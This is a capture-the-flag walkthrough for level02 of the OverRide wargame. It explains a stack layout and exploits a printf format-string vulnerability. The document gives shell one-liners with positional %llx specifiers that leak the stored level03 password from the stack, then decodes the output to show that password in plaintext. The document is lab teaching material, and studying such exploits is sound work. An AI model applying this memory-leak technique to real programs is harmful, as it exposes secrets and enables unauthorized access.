1. cd source.c => to get into the `system("\bin\sh")` command, we need to haev the password stroed in the password_file buffer(the real level03 password), equals to the password asked in the prompt.

2. First thoughts : the buffer in which we enter our password is above the password_file buffer in the stack : 0x110 - 0xa0 = 0x70 or 112 bytes above. If we can enter a sufficiently long password, so that the 113 bytes (first bytes of real password buffer) is erased with a `\0`, and our password's first byte is `\0`, it could work out!

3. Problem : the length of our password is protected by `fgets` : 100 bytes maximum.

4. Solution : there is a known printf vulnerability when passing a buffer directly, which is the case here line 38 : the username buffer is passed as an argument to printf. Hence, by entering some modifier into the buffer, we can read in the stack memory, starting from the printf function which is above the main on the stack.

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p
--[ Password: AAAA
*****************************************
0x7fffffffe490 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe688 0x1f7ff9a08 0x41414141 (nil)  does not have access!
```

We can see that the first 6 arguments are values stored in the different registers, and that the 8th argument is the start of our password buffer ("A" = 0x41). Furthermore, we know that the buffer containing the real password is at `$rbp-0xa0`, and our password is sotred at `$rbp-0x110`. So the real password is sotred 0x70 or 112 bytes from our password. 112/8 = 14 eight-bytes memory values.

14+8 = 22 => the real password start at argument number 22. Let's print a couple of 8-bytes values (so `%llx` as long hexadecimal => 8 bytes by 8 bytes):

```
level02@OverRide:~$ (python -c 'print("%22$016llx "+"%23$016llx "+"%24$016llx "+"%25$016llx "+"%26$016llx "+"%27$016llx ")' ; python -c 'print("AAAA")')  | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0000000000000000  does not have access!
```

We can see that the password we are looking to decrypt is stored from 22nd to 26th "arguments" of printf.
*Note: 016 means 16 characters long with 0 filling the left part*

As the printf prints the username, we can enter these hex values as username, reversing each 8-bytes long number because of little-endianness :

```
level02@OverRide:~$ (python -c 'print("\x75\x6e\x50\x52\x34\x37\x68\x48"[::-1]+"\x45\x41\x4a\x35\x61\x73\x39\x51"[::-1]+"\x37\x7a\x71\x43\x57\x4e\x67\x58"[::-1]+"\x35\x4a\x35\x68\x6e\x47\x58\x73"[::-1]+"\x48\x33\x67\x50\x66\x4b\x39\x4d"[::-1])' ; python -c 'print("AAAA")')  | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H does not have access!
```

The username is the required password!
